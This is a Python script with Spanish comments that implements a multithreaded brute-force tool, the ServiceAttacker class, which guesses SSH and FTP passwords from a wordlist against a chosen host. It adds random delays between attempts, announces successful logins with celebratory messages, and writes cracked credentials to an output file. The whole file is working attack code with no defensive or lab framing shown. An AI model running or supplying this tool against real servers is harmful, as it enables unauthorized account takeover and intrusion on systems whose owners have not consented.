#!/usr/bin/env python3
import paramiko
import ftplib
import socket
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

class ServiceAttacker:
    def __init__(self, target, port, username, wordlist, threads=4, delay=0, output=None):
        self.target = target
        self.port = port
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.delay = delay
        self.output = output
        self.found = False
    
    def save_result(self, service, password):
        """Guarda credenciales encontradas"""
        result = f"[+] {service.upper()} | {self.target}:{self.port} | {self.username}:{password}\n"
        if self.output:
            with open(self.output, 'a') as f:
                f.write(result)
            print(f"💾 Credenciales guardadas en: {self.output}")
    
    def try_ssh(self, password):
        """Intenta conexión SSH"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=self.username, 
                          password=password, timeout=5)
            client.close()
            return True, password
        except:
            return False, None
    
    def try_ftp(self, password):
        """Intenta conexión FTP"""
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port)
            ftp.login(self.username, password)
            ftp.quit()
            return True, password
        except:
            return False, None
    
    def attack_ssh(self):
        """Ataque a servicio SSH"""
        print(f"🎯 SSH objetivo: {self.target}:{self.port}")
        print(f"👤 Usuario: {self.username}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        total = len(passwords)
        print(f"📊 Total contraseñas: {total:,}")
        
        with tqdm(total=total, desc="Probando SSH", unit="pass") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.try_ssh, pwd): pwd for pwd in passwords}
                
                for future in as_completed(futures):
                    success, password = future.result()
                    if success:
                        print(f"\n✅ ¡ACCESO SSH CONCEDIDO! 🎉")
                        print(f"🔓 Credenciales: {self.username}:{password}")
                        self.save_result('ssh', password)
                        self.found = True
                        executor.shutdown(wait=False)
                        break
                    pbar.update(1)
        
        if not self.found:
            print("\n❌ No se encontraron credenciales válidas")
    
    def attack_ftp(self):
        """Ataque a servicio FTP"""
        print(f"🎯 FTP objetivo: {self.target}:{self.port}")
        print(f"👤 Usuario: {self.username}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        total = len(passwords)
        print(f"📊 Total contraseñas: {total:,}")
        
        with tqdm(total=total, desc="Probando FTP", unit="pass") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.try_ftp, pwd): pwd for pwd in passwords}
                
                for future in as_completed(futures):
                    success, password = future.result()
                    if success:
                        print(f"\n✅ ¡ACCESO FTP CONCEDIDO! 🎉")
                        print(f"🔓 Credenciales: {self.username}:{password}")
                        self.save_result('ftp', password)
                        self.found = True
                        executor.shutdown(wait=False)
                        break
                    pbar.update(1)
        
        if not self.found:
            print("\n❌ No se encontraron credenciales válidas")
